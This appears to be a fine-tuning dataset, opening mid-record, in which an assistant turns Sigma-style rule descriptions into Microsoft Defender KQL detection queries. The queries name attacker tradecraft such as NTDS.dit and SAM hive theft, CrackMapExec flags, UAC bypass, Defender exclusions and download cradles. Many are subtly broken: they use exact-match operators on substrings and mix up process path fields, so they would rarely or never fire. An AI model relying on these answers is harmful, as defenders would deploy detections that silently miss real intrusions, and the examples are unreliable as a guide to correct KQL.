\"\\\\Device Driver Packages\" or RegistryKey endswith \"\\\\Diagnostic Data Viewer database files\" or RegistryKey endswith \"\\\\Downloaded Program Files\" or RegistryKey endswith \"\\\\DownloadsFolder\" or RegistryKey endswith \"\\\\Feedback Hub Archive log files\" or RegistryKey endswith \"\\\\Internet Cache Files\" or RegistryKey endswith \"\\\\Language Pack\" or RegistryKey endswith \"\\\\Microsoft Office Temp Files\" or RegistryKey endswith \"\\\\Offline Pages Files\" or RegistryKey endswith \"\\\\Old ChkDsk Files\" or RegistryKey endswith \"\\\\Previous Installations\" or RegistryKey endswith \"\\\\Recycle Bin\" or RegistryKey endswith \"\\\\RetailDemo Offline Content\" or RegistryKey endswith \"\\\\Setup Log Files\" or RegistryKey endswith \"\\\\System error memory dump files\" or RegistryKey endswith \"\\\\System error minidump files\" or RegistryKey endswith \"\\\\Temporary Files\" or RegistryKey endswith \"\\\\Temporary Setup Files\" or RegistryKey endswith \"\\\\Temporary Sync Files\" or RegistryKey endswith \"\\\\Thumbnail Cache\" or RegistryKey endswith \"\\\\Update Cleanup\" or RegistryKey endswith \"\\\\Upgrade Discarded Files\" or RegistryKey endswith \"\\\\User file versions\" or RegistryKey endswith \"\\\\Windows Defender\" or RegistryKey endswith \"\\\\Windows Error Reporting Files\" or RegistryKey endswith \"\\\\Windows ESD installation files\" or RegistryKey endswith \"\\\\Windows Upgrade Log Files\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"touch\" process in service file. Topic: proc_creation_lnx_touch_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \".service\" and ProcessCommandLine =~ \" -t \" and InitiatingProcessFolderPath =~ \"/touch\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required) Topic: proc_creation_win_dnscmd_install_new_server_level_plugin_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/config\", \"/serverlevelplugindll\")) and InitiatingProcessFolderPath =~ \"\\\\dnscmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to environment variables related to ETW logging via the CommandLine.\nThis could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\n Topic: proc_creation_win_susp_etw_modification_cmdline"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"COMPlus_ETWEnabled\", \"COMPlus_ETWFlags\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command lines that contain the accepteula flag which could be a sign of execution of one of the Sysinternals tools Topic: proc_creation_win_sysinternals_eula_accepted"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \" -accepteula\" or ProcessCommandLine contains \" /accepteula\" or ProcessCommandLine contains \" \u2013accepteula\" or ProcessCommandLine contains \" \u2014accepteula\" or ProcessCommandLine contains \" \u2015accepteula\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder. Topic: proc_creation_macos_schedule_task_job_cron"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/tmp/\" and InitiatingProcessFolderPath =~ \"/crontab\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects certain command line parameters often used during reconnaissance activity via web shells Topic: proc_creation_win_webshell_recon_commands_and_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"-tomcat-\", \"\\\\tomcat\")) or ((InitiatingProcessFileName in~ (\"\\\\java.exe\", \"\\\\javaw.exe\")) and (ProcessCommandLine in~ (\"catalina.jar\", \"CATALINA_HOME\"))) or (InitiatingProcessFileName in~ (\"\\\\w3wp.exe\", \"\\\\php-cgi.exe\", \"\\\\nginx.exe\", \"\\\\httpd.exe\", \"\\\\caddy.exe\", \"\\\\ws_tomcatservice.exe\"))) and ((ProcessCommandLine in~ (\"&cd&echo\", \"cd /d \")) or ((FolderPath endswith \"\\\\dsquery.exe\" or FolderPath endswith \"\\\\find.exe\" or FolderPath endswith \"\\\\findstr.exe\" or FolderPath endswith \"\\\\ipconfig.exe\" or FolderPath endswith \"\\\\netstat.exe\" or FolderPath endswith \"\\\\nslookup.exe\" or FolderPath endswith \"\\\\pathping.exe\" or FolderPath endswith \"\\\\quser.exe\" or FolderPath endswith \"\\\\schtasks.exe\" or FolderPath endswith \"\\\\systeminfo.exe\" or FolderPath endswith \"\\\\tasklist.exe\" or FolderPath endswith \"\\\\tracert.exe\" or FolderPath endswith \"\\\\ver.exe\" or FolderPath endswith \"\\\\wevtutil.exe\" or FolderPath endswith \"\\\\whoami.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"dsquery.exe\", \"find.exe\", \"findstr.exe\", \"ipconfig.exe\", \"netstat.exe\", \"nslookup.exe\", \"pathping.exe\", \"quser.exe\", \"schtasks.exe\", \"sysinfo.exe\", \"tasklist.exe\", \"tracert.exe\", \"ver.exe\", \"VSSADMIN.EXE\", \"wevtutil.exe\", \"whoami.exe\"))) or (ProcessCommandLine in~ (\" Test-NetConnection \", \"dir \\\\\")) or ((ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")) and (ProcessCommandLine in~ (\" user \", \" use \", \" group \"))) or (ProcessVersionInfoOriginalFileName =~ \"ping.exe\" and ProcessCommandLine =~ \" -n \") or ((ProcessCommandLine in~ (\" -enc \", \" -EncodedCommand \", \" -w hidden \", \" -windowstyle hidden\", \".WebClient).Download\")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) or (ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" and ProcessCommandLine =~ \" /node:\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \".xbap\" (Browser Applications) files via PresentationHost.EXE from an uncommon location. These files can be abused to run malicious \".xbap\" files any bypass AWL\n Topic: proc_creation_win_presentationhost_uncommon_location_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \".xbap\" and (FolderPath endswith \"\\\\presentationhost.exe\" or ProcessVersionInfoOriginalFileName =~ \"PresentationHost.exe\")) and (not((ProcessCommandLine in~ (\" C:\\\\Windows\\\\\", \" C:\\\\Program Files\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of an ad-hoc Cloudflare Quick Tunnel, which can be used to tunnel local services such as HTTP, RDP, SSH and SMB.\nThe free TryCloudflare Quick Tunnel will generate a random subdomain on trycloudflare[.]com, following a call to api[.]trycloudflare[.]com.\nThe tool has been observed in use by threat groups including Akira ransomware.\n Topic: proc_creation_win_cloudflared_quicktunnel_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\cloudflared.exe\" or FolderPath endswith \"\\\\cloudflared-windows-386.exe\" or FolderPath endswith \"\\\\cloudflared-windows-amd64.exe\") or (SHA256 startswith \"2fb6c04c4f95fb8d158af94c137f90ac820716deaf88d8ebec956254e046cb29\" or SHA256 startswith \"b3d21940a10fdef5e415ad70331ce257c24fe3bcf7722262302e0421791f87e8\" or SHA256 startswith \"1fbd8362b2d2d2e6a5750ae3db69cd1815e6c1d31da48a98b796450971a8e039\" or SHA256 startswith \"0409c9b12f9d0eda86e461ed9bdabeefb00172b26322079681a0bdf48e68dc28\" or SHA256 startswith \"7cfb411d04bac42ef93d1f0c93c0a481e38c6f4612b97ae89d4702595988edc7\" or SHA256 startswith \"5b3c2d846ab162dc6bc595cce3a49de5731afde5d6060be7066d21b013a28373\" or SHA256 startswith \"ce95df7f69664c3df19b76028e115931919a71517b776da7b42d353e2ff4a670\" or SHA256 startswith \"1293525a19cfe3bc8296b62fbfe19f083632ed644a1c18c10b045a1d3030d81a\" or SHA256 startswith \"af2b9161cfcb654b16408cd6b098afe9d1fb61a037d18d7090a119d4c0c8e0f0\" or SHA256 startswith \"39ddceb56a15798826a5fc4892fa2b474c444bb4d7a8bf2fa95e41cab10fa7a1\" or SHA256 startswith \"ccd11f2328023a0e7929e845d5b6e7bc783fb4650d65faef3ae090239d4bbce2\" or SHA256 startswith \"b6e5c5d2567ae8c69cc012ebcae30e6c9b5359d64a58d17ba75ec89f8bce71ac\" or SHA256 startswith \"f813484ea441404f18caad96f28138e8aaf0cb256163c09c2ab8a3acab87f69f\" or SHA256 startswith \"fc4a0802ab9c7409b892ca00636bec61e2acfc911bccfdeb9978b8ab5a2f828d\" or SHA256 startswith \"083150724b49604c8765c1ba19541fa260b133be0acb0647fcd936d81f054499\" or SHA256 startswith \"44303d6572956f28a0f2e4b188934fb9874f2584f5c81fa431a463cfbf28083b\" or SHA256 startswith \"5d38c46032a58e28ae5f7d174d8761ec3d64d186677f3ec53af5f51afb9bfd2f\" or SHA256 startswith \"e1e70fa42059911bc6685fafef957f9a73fc66f214d0704a9b932683a5204032\" or SHA256 startswith \"c01356092a365b84f84f0e66870bd1a05ba3feb53cafd973fa5fea2534bee234\" or SHA256 startswith \"b3f9c06151e30ee43d39e788a79cd918a314f24e04fe87f3de8272a2057b624f\" or SHA256 startswith \"cd81b2792f0739f473c31c9cb7cf2313154bfa28b839975802b90e8790bb5058\" or SHA256 startswith \"9ec7e6c8e1bfd883663d8d9d62c9e4f9ae373b731407181e32491b27a7218a2c\" or SHA256 startswith \"c2cfd23fdc6c0e1b1ffa0e545cbe556f18d11b362b4a89ba0713f6ab01c4827f\" or SHA256 startswith \"53f8adbd76c0eb16f5e43cadde422474d8a06f9c8f959389c1930042ad8beaa5\" or SHA256 startswith \"648c8d2f8001c113d2986dd00b7bbd181593d462bef73522cee212c4f71f95b3\" or SHA256 startswith \"ae047e2095e46c3f9c518b2be67ec753f4f0aad23b261a361fcb6144dcdb63b4\" or SHA256 startswith \"3153d2baa462978dd22ab33d1c2274ecc88c200225d6a3327f98d5b752d08f5c\" or SHA256 startswith \"f49cde976e628012c9db73e1c8d76081944ecf2297cdafeb78bb13290da274c4\" or SHA256 startswith \"d2513e58bb03ccc83affde685c6ef987924c37ce6707d8e9857e2524b0d7e90f\" or SHA256 startswith \"bb67c7623ba92fe64ffd9816b8d5b3b1ea3013960a30bd4cf6e295b3eb5b1bad\" or SHA256 startswith \"b34b3c3a91e3165d1481f0b3ec23eab93a1cfba94345a6cbfe5b18ddbd48eac7\" or SHA256 startswith \"f7848034e010d55f15e474ca998f96391e320ff29b00cfcc4c5e536529703e75\" or SHA256 startswith \"b6fc9493778cbe3bfc062d73f5cc604bc0ff058bc5e5dc6aac87f3a4008b54b6\" or SHA256 startswith \"f5c5e962577e2293c4ad10603816dce7cc273585969615fbf4e4bfa9eaff1688\" or SHA256 startswith \"d14c52d9220b606f428a8fe9f7c108b0d6f14cf71e7384749e98e6a95962e68f\" or SHA256 startswith \"d3a0e1a79158f3985cd49607ebe0cdfcc49cb9af96b8f43aefd0cdfe2f22e663\" or SHA256 startswith \"2fbbfc8299537ff80cadf9d0e27c223fe0ccb9052bf9d8763ad717bbfa521c77\" or SHA256 startswith \"19074674c6fbdaa573b3081745e5e26144fdf7a086d14e0e220d1814f1f13078\")) and ((ProcessCommandLine contains \"-url\" and ProcessCommandLine contains \"tunnel\") or (ProcessCommandLine contains \".exe -url\" or ProcessCommandLine contains \".exe --url\"))) or (ProcessCommandLine in~ (\"-url\", \"-no-autoupdate\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\nThis technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\n Topic: proc_creation_win_cmd_redirection_susp_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\") and (((ProcessCommandLine contains \">\" and ProcessCommandLine contains \"%APPDATA%\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"%TEMP%\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"%TMP%\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"%USERPROFILE%\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"C:\\\\ProgramData\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"C:\\\\Temp\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"C:\\\\Users\\\\Public\\\\\") or (ProcessCommandLine contains \">\" and ProcessCommandLine contains \"C:\\\\Windows\\\\Temp\\\\\")) or (ProcessCommandLine in~ (\"C:\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.\nSCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n Topic: proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/var/opt/microsoft/scx/tmp\" and InitiatingProcessSessionId == 0 and ProcessCommandLine =~ \"/bin/sh\" and AccountName =~ \"root\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects system information discovery commands Topic: proc_creation_lnx_system_info_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/uname\", \"/hostname\", \"/uptime\", \"/lspci\", \"/dmidecode\", \"/lscpu\", \"/lsmod\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the initial execution of the Raspberry Robin malware from an external drive using \"Cmd.EXE\". Topic: proc_creation_win_malware_raspberry_robin_external_drive_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http:\", \"https:\")) and ((ProcessCommandLine contains \"-q\" or ProcessCommandLine contains \"/q\" or ProcessCommandLine contains \"\u2013q\" or ProcessCommandLine contains \"\u2014q\" or ProcessCommandLine contains \"\u2015q\") and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\") and ((InitiatingProcessCommandLine in~ (\".bin\", \".ico\", \".lnk\", \".lo\", \".sv\", \".usb\")) and InitiatingProcessFileName =~ \"\\\\cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing) Topic: proc_creation_win_lolbin_pester"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\"{ Invoke-Pester -EnableExit ;\", \"{ Get-Help \\\"\")) and (InitiatingProcessCommandLine =~ \"\\\\WindowsPowerShell\\\\Modules\\\\Pester\\\\\" and (InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the export of a crital Registry key to a file. Topic: proc_creation_win_regedit_export_critical_keys"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -E \" or ProcessCommandLine contains \" /E \" or ProcessCommandLine contains \" \u2013E \" or ProcessCommandLine contains \" \u2014E \" or ProcessCommandLine contains \" \u2015E \") and (ProcessCommandLine in~ (\"hklm\", \"hkey_local_machine\")) and (ProcessCommandLine endswith \"\\\\system\" or ProcessCommandLine endswith \"\\\\sam\" or ProcessCommandLine endswith \"\\\\security\") and (FolderPath endswith \"\\\\regedit.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGEDIT.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process patterns used in NTDS.DIT exfiltration Topic: proc_creation_win_susp_ntds"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"ac i ntds\", \"create full\")) or (ProcessCommandLine in~ (\"/c copy \", \"\\\\windows\\\\ntds\\\\ntds.dit\")) or (ProcessCommandLine in~ (\"activate instance ntds\", \"create full\")) or (ProcessCommandLine in~ (\"powershell\", \"ntds.dit\")) or ((FolderPath endswith \"\\\\NTDSDump.exe\" or FolderPath endswith \"\\\\NTDSDumpEx.exe\") or (ProcessCommandLine contains \"ntds.dit\" and ProcessCommandLine contains \"system.hiv\") or ProcessCommandLine contains \"NTDSgrab.ps1\")) or (((InitiatingProcessFolderPath contains \"\\\\apache\" or InitiatingProcessFolderPath contains \"\\\\tomcat\" or InitiatingProcessFolderPath contains \"\\\\AppData\\\\\" or InitiatingProcessFolderPath contains \"\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\PerfLogs\\\\\") or (FolderPath contains \"\\\\apache\" or FolderPath contains \"\\\\tomcat\" or FolderPath contains \"\\\\AppData\\\\\" or FolderPath contains \"\\\\Temp\\\\\" or FolderPath contains \"\\\\Public\\\\\" or FolderPath contains \"\\\\PerfLogs\\\\\")) and ProcessCommandLine =~ \"ntds.dit\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the suspicious RUN keys created by software located in Download or temporary Outlook/Internet Explorer directories Topic: registry_event_susp_download_run_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (InitiatingProcessFolderPath contains \"\\\\Downloads\\\\\" or InitiatingProcessFolderPath contains \"\\\\Temporary Internet Files\\\\Content.Outlook\\\\\" or InitiatingProcessFolderPath contains \"\\\\Local Settings\\\\Temporary Internet Files\\\\\") and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects manual execution of the \"Microsoft Compatibility Appraiser\" task via schtasks.\nIn order to trigger persistence stored in the \"\\AppCompatFlags\\TelemetryController\" registry key.\n Topic: proc_creation_win_schtasks_persistence_windows_telemetry"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"run \", \"\\\\Application Experience\\\\Microsoft Compatibility Appraiser\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) Topic: proc_creation_win_uac_bypass_msconfig_gui"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\"C:\\\\Windows\\\\system32\\\\msconfig.exe\\\" -5\" and InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\pkgmgr.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced. Topic: proc_creation_win_hktl_crackmapexec_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath =~ \"\\\\crackmapexec.exe\" or (ProcessCommandLine in~ (\" --local-auth\", \" -u \", \" -x \")) or (ProcessCommandLine in~ (\" --local-auth\", \" -u \", \" -p \", \" -H 'NTHASH'\")) or (ProcessCommandLine in~ (\" mssql \", \" -u \", \" -p \", \" -M \", \" -d \")) or (ProcessCommandLine in~ (\" smb \", \" -u \", \" -H \", \" -M \", \" -o \")) or (ProcessCommandLine in~ (\" smb \", \" -u \", \" -p \", \" --local-auth\")) or ProcessCommandLine =~ \" -M pe_inject \") or ((ProcessCommandLine in~ (\" --local-auth\", \" -u \", \" -p \")) and (ProcessCommandLine in~ (\" 10.\", \" 192.168.\", \"/24 \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block Topic: proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[\" or ProcessCommandLine matches regex \"\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[\" or ProcessCommandLine matches regex \"\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[\" or ProcessCommandLine matches regex \"\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}\" or ProcessCommandLine matches regex \"\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name\" or ProcessCommandLine matches regex \"\\\\$VerbosePreference\\\\.ToString\\\\(\" or ProcessCommandLine matches regex \"\\\\[String\\\\]\\\\s*\\\\$VerbosePreference\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious use of PCHunter, a tool like Process Hacker to view and manipulate processes, kernel options and other low level stuff Topic: proc_creation_win_hktl_pchunter"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((SHA1 startswith \"5F1CBC3D99558307BC1250D084FA968521482025\" or SHA1 startswith \"3FB89787CB97D902780DA080545584D97FB1C2EB\") or (MD5 startswith \"987B65CD9B9F4E9A1AFD8F8B48CF64A7\" or MD5 startswith \"228DD0C2E6287547E26FFBD973A40F14\") or (SHA256 startswith \"2B214BDDAAB130C274DE6204AF6DBA5AEEC7433DA99AA950022FA306421A6D32\" or SHA256 startswith \"55F041BF4E78E9BFA6D4EE68BE40E496CE3A1353E1CA4306598589E19802522C\")) or (InitiatingProcessFolderPath in~ (\"\\\\PCHunter64.exe\", \"\\\\PCHunter32.exe\")) or (ProcessVersionInfoOriginalFileName =~ \"PCHunter.exe\" or ProcessVersionInfoFileDescription =~ \"Epoolsoft Windows Information View Tools\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an unexpected file being modified by dns.exe which my indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed) Topic: file_change_win_unusual_modification_by_dns_exe"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"\\\\dns.exe\" and (not(FileName =~ \"\\\\dns.log\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Download and compress a remote file and store it in a cab file on local machine. Topic: proc_creation_win_lolbin_diantz_remote_cab"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"diantz.exe\", \" \\\\\\\\\", \".cab\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files to download arbitrary files Topic: proc_creation_win_presentationhost_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://\", \"https://\", \"ftp://\")) and (FolderPath endswith \"\\\\presentationhost.exe\" or ProcessVersionInfoOriginalFileName =~ \"PresentationHost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects actions caused by the RedMimicry Winnti playbook a automated breach emulations utility Topic: proc_creation_win_hktl_redmimicry_winnti_playbook"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"gthread-3.6.dll\", \"\\\\Windows\\\\Temp\\\\tmp.bat\", \"sigcmm-2.4.dll\")) and (InitiatingProcessFolderPath in~ (\"\\\\rundll32.exe\", \"\\\\cmd.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility. Topic: proc_creation_win_schtasks_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" /create \" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (not((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data. Topic: proc_creation_win_renamed_gpg4win"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"gpg.exe\" and (not((InitiatingProcessFolderPath in~ (\"\\\\gpg.exe\", \"\\\\gpg2.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Process Hacker based on binary metadata information (Image, Hash, Imphash, etc).\nProcess Hacker is a tool to view and manipulate processes, kernel options and other low level options.\nThreat actors abused older vulnerable versions to manipulate system processes.\n Topic: proc_creation_win_pua_process_hacker"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"\\\\ProcessHacker_\" or FolderPath endswith \"\\\\ProcessHacker.exe\" or (ProcessVersionInfoOriginalFileName in~ (\"ProcessHacker.exe\", \"Process Hacker\")) or ProcessVersionInfoFileDescription =~ \"Process Hacker\" or ProcessVersionInfoProductName =~ \"Process Hacker\" or ((MD5 startswith \"68F9B52895F4D34E74112F3129B3B00D\" or MD5 startswith \"B365AF317AE730A67C936F21432B9C71\") or (SHA1 startswith \"A0BDFAC3CE1880B32FF9B696458327CE352E3B1D\" or SHA1 startswith \"C5E2018BF7C0F314FED4FD7FE7E69FA2E648359E\") or (SHA256 startswith \"D4A0FE56316A2C45B9BA9AC1005363309A3EDC7ACF9E4DF64D326A0FF273E80F\" or SHA256 startswith \"BD2C2CF0631D881ED382817AFCCE2B093F4E412FFB170A719E2762F250ABFEA4\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452 Topic: proc_creation_win_rundll32_sys"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"rundll32.exe\" and (ProcessCommandLine in~ (\".sys,\", \".sys \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of \"reg.exe\" to add Defender folder exclusions. Qbot has been seen using this technique to add exclusions for folders within AppData and ProgramData. Topic: proc_creation_win_reg_defender_exclusion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ADD \", \"/t \", \"REG_DWORD \", \"/v \", \"/d \", \"0\")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\""}]}
